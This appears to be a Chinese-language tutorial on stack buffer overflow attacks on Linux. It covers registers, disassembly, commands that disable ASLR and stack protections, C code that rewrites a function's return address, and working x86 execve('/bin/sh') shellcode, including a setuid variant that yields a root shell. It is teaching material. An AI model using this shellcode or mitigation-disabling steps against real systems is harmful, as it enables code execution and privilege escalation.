# 缓冲区溢出

在关闭数据执行保护机制下，在Linux系统平台上实现缓冲区溢出攻击。

## gdb
https://github.com/dreamsxin/example/blob/master/gdb/README.md?plain=1#L11
## 缓冲区的概念

进程使用的内存都可以按照功能大致分成以下 4 个部分：
- 代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取指并执行。
- 数据区：用于存储全局变量等。
- 堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。
- 栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。

缓冲区就是一块连续的计算机内存区域，可以是堆栈(自动变量)、堆(动态内存)和数据区(全局或静态)，可保存相同数据类型的多个实例。

## 攻击原理

缓冲区是操作系统内存中一段连续的存储空间，当一段程序尝试把更多的数据放入一个缓冲区，数据超出缓冲区的预留范围时, 或者说当一段程序尝试把数据放入的内存位置超出了缓冲区的边界时, 便触发了缓冲区溢出漏洞；如果向一个缓冲区写入数据, 并且写入的数据量比缓冲区大时, 缓冲区溢出漏洞就会被触发，缓冲区溢出漏洞使攻击者能够执行恶意代码或者使程序崩溃，由于广泛使用的C和C++程序语言没有对数组读写数据进行边界检查的机制, 导致了这一漏洞常常被攻击者所利用。成功地利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。

## 操作指令
- esp（Extended Stack Pointer）指向系统栈最上面一个栈帧的栈顶；
- ebp（Extended Base Pointer）指向系统栈最上面一个栈帧的栈底；
- eip（Extended Instruction Pointer）指向代码区中将要执行的下一条指令，执行方式包括顺序执行和跳转。

## 反汇编 objdump

- -p, --private-headers Display object format specific file header contents
- -h, --[section-]headers Display the contents of the section headers
- -x, --all-headers Display the contents of all headers
- -d, --disassemble Display assembler contents of executable sections
- -S, --source             Intermix source code with disassembly


## GCC编译过程
```out
-------------------------------------
Pre-Processing   cpp        预处理       gcc -E  可以查看
Compiling        ccl        编译         gcc -S  可以得到
Assembling       as         汇编         gcc -c  进行汇编
Linking          ld         链接
```
## 寄存器简介

寄存器名字	寄存器简介
eax：通常用来执行加法，函数调用的返回值一般也放在这里面
ebx：数据存取
ecx：通常用作计数器，比如for循环
edx：暂不清楚
esp：栈顶指针，指向栈的顶部
ebp：栈底指针，指向栈的底部，通常用ebp+偏移量的形式来定位函数存放在栈中的局部变量
edi：字符串操作时，用于存放数据源的地址
esi：字符串操作时，用于存放目的地址的，和edi两个经常搭配一起使用，执行字符串的复制等操作
eip：CS一同指向即将执行的那条指令的地址

## 64位的寄存器
rax：通常用于存储函数调用返回值
rsp：栈顶指针，指向栈的顶部
rdi：第一个入参
rsi：第二个入参
rdx：第三个入参
rcx：第四个入参
r8：第五个入参
r9：第六个入参
rbx：数据存储，遵循Callee Save原则
rbp：数据存储，遵循Callee Save原则
r12~r15：数据存储，遵循Callee Save原则
r10~r11：数据存储，遵循Caller Save原则

## 常见指令
汇编指令	指令简介
mov	赋值，mov src, dst
push	push src 压入栈                   push指令主要把数据压入栈顶，会让esp-4
pop	pop dest 出栈                     pop指令主要从栈顶里面弹出一个元素，会让esp+4
call	call symbol 进行函数调用          主要做如下两件事情：把返回地址压入栈；跳转到functionlabel
ret	结束函数调用                      从栈里面pop地址，跳转到这个地址

## 编译时去掉缓冲区溢出保护措施

### 地址随机化
执行以下命令禁用地址随机化功能：
```shell
sudo sysctl -w kernel.randomize_va_space=0
```
或者
```shell
sudo su
echo 0 > /proc/sys/kernel/randomize_va_space
```
### 栈保护机制

在gcc编译时加上以下参数使栈可执行：
- -fno-stack-protector

### 栈不可执行
在gcc编译时加上以下参数使栈可执行：
- -z execstack

### 使栈不可执行：
- -z noexecstack

### 修改调用地址，示例

*32位系统代码*
默认指针大小为4个字节
```c
#include <stdio.h>
#include <stdlib.h>

//修改函数回调的返回地址
void foo(void) {
        int a, *p;
        p = (int*)((char*)&a + 12); //12字节 (int*)(&a + 3)
        *p += 12;
}

int main(void) {
        printf("int字节%d\n", sizeof(int));
        foo();
        printf("我是正常的返回地址\n");
        printf("我是被修改的返回地址\n");
}
```
编译
```shell
gcc -g -z execstack -fno-stack-protector test.c
```

*64位系统*
默认指针大小为8个字节

如果是64位系统，反汇编看下结果：
```shell
objdump a.out -d
```
```out
0000000000001149 <foo>:
    1149:       f3 0f 1e fa             endbr64
    114d:       55                      push   %rbp
    114e:       48 89 e5                mov    %rsp,%rbp
    1151:       48 8d 45 f4             lea    -0xc(%rbp),%rax
    1155:       48 83 c0 14             add    $0x14,%rax
    1159:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    115d:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    1161:       8b 00                   mov    (%rax),%eax
    1163:       8d 50 0f                lea    0xf(%rax),%edx
    1166:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    116a:       89 10                   mov    %edx,(%rax)
    116c:       90                      nop
    116d:       5d                      pop    %rbp
    116e:       c3                      ret

000000000000116f <main>:
    116f:       f3 0f 1e fa             endbr64
    1173:       55                      push   %rbp
    1174:       48 89 e5                mov    %rsp,%rbp
    1177:       e8 cd ff ff ff          call   1149 <foo>
    117c:       48 8d 05 85 0e 00 00    lea    0xe85(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    1183:       48 89 c7                mov    %rax,%rdi
    1186:       e8 c5 fe ff ff          call   1050 <puts@plt>
    118b:       48 8d 05 96 0e 00 00    lea    0xe96(%rip),%rax        # 2028 <_IO_stdin_used+0x28>
    1192:       48 89 c7                mov    %rax,%rdi
    1195:       e8 b6 fe ff ff          call   1050 <puts@plt>
    119a:       b8 00 00 00 00          mov    $0x0,%eax
    119f:       5d                      pop    %rbp
    11a0:       c3                      ret

Disassembly of section .fini:

00000000000011a4 <_fini>:
    11a4:       f3 0f 1e fa             endbr64
    11a8:       48 83 ec 08             sub    $0x8,%rsp
    11ac:       48 83 c4 08             add    $0x8,%rsp
    11b0:       c3                      ret
```
上面的反汇编代码可以，看到这行 `1151:       48 8d 45 f4             lea    -0xc(%rbp),%rax`，指令将`-12(%rbp)`的地址赋值给`%rax`64位寄存器`(p = &a)`。可知`foo()`函数中的变量`a`存储在`-12(%rbp)`地址上，该地址向上`12+8=20·个单位就是返回地址`((char *)&a + 20)`。

`call   1149 <foo>` 后面的指令`mov    %rax,%rdi`压入参数进入调用`call   1050 <puts@plt>`指令地址是`1183`，而第二个压入参数`mov    %rax,%rdi`进入调用`call   1050 <puts@plt>`指令地址是`1192`。两者相差`15`，故将返回地址的值加`15`即可`(*p += 15)`。

修改代码
```c
#include <stdio.h>
#include <stdlib.h>

void foo(void) {
        int a, *p;
        p = (int*)((char*)&a + 20);
        *p += 15;
}

int main(void) {
        foo();
        printf("我是正常的返回地址\n");
        printf("我是被修改的返回地址\n");
}
```
```shell
gcc -g -z execstack -fno-stack-protector test.c
```

## `strcpy` 函数

`strcpy` 函数复制`src`指向的字符串，包括终止空字节（`'\0'`），指向缓冲区到`dest`。
当`dest`指向的存储空间不足以存储`src`指向的字符串时，`dest`内存空间的值就会被覆盖，许多缓冲区溢出攻击正是利用了这一漏洞。

## shellcode
shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机器码，以其经常让攻击者获得shell而得名。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。

shellcode常常使用机器语言编写，由于现代电脑系统基本上启用NX位元保护使得机械码无法直接执行，可透过返回导向编程编写shellcode。

### C语言写法
```c
/* cshell.c*/
#include <stdio.h>
​
int main()
{
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
	return 0;
}
 ```
在terminal执行以下命令可调出新的shell。
```c
 gcc chsell.c -o cshell
 ./cshell
 ```
### 汇编写法

编写shellcode.asm文件
```asm
section .text
global _start
_start:
xor eax, eax
push eax;”\x00”
push 0x68732f2f;”//sh” 入栈
push 0x6e69622f;”/bin” 入栈
mov ebx, esp;ebx = esp “/bin//sh”的地址
push eax;”\x00”入栈
push ebx;”/bin//sh”地址入栈
mov ecx, esp;ecx = esp 为指针数组地址
xor edx, edx;edx = 0，这里可以用cdq指令代替
mov al, 0xb
int 0x80
```
运行以下命令编译和执行汇编代码：
```shell
sudo apt install nasm
nasm -f elf shellcode.asm
ld -m elf_i386 -o shellcode_asm shellcode.o
./shellcode_asm
```
使用以下命令将可执行文件shellcode_asm反编译
```shell
objdump -d shellcode_asm
```
从反汇编结果中得到`shellcode`的字符数组以供`c`语言程序使用：
```c
/*shellcode_test.c */
#include <stdio.h>
#include <string.h>

int main()
{

	char shellcode[]=
	    "\x31\xc0"				/* xor   %eax,%eax */
	    "\x50"					/* push   %eax */
	    "\x68""//sh"				/* push   $0x68732f2f */
	    "\x68""/bin"				/* push   $0x6e69622f */
	    "\x89\xe3"				/* mov    %esp,%ebx */
	    "\x50"					/* push   %eax */
	    "\x53"					/* push   %ebx */
	    "\x89\xe1"				/* mov    %esp,%ecx */
	    "\x31\xd2"				/* xor    %edx, %edx */
	    "\xb0\x0b"				/* movb    $0xb,%al */
	    "\xcd\x80";				/* int     $0x80 */ 

	void (*fp)(void);
	fp = (void*)shellcode;
	fp();
	
	return 0;
}
```
```shell
gcc -Wall -g -o shellcode_test shellcode_test.c -z execstack -fno-stack-protector -m32
ll | grep shellcode_test
./shellcode_test
```
发现以普通用户的身份执行普通程序调用出的shell时，在被调用shell中的身份依旧是普通用户。
`whoami`

我们换下 `shellcode`
```c
/*shellcode_test.c*/
#include <stdio.h>
#include <string.h>

int main()
{
	char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";

	void (*fp)(void);
	fp = (void*)shellcode;
	fp();

	return 0;
}
```
重新运行该文件，得到的结果如下。说明使用新的shellcode，以普通用户的身份运行设置了uid的程序，在该程序调出的shell中，用户身份是root：
```shell
gcc -Wall -g -o shellcode_test shellcode_test.c -z execstack -fno-stack-protector -m32
sudo chown root shellcode_test
sudo chmod u+s shellcode_test
ll | grep shellcode_test
./shellcode_test
```
网上可以搜索 `exploit.c` 也是利用漏洞提权。
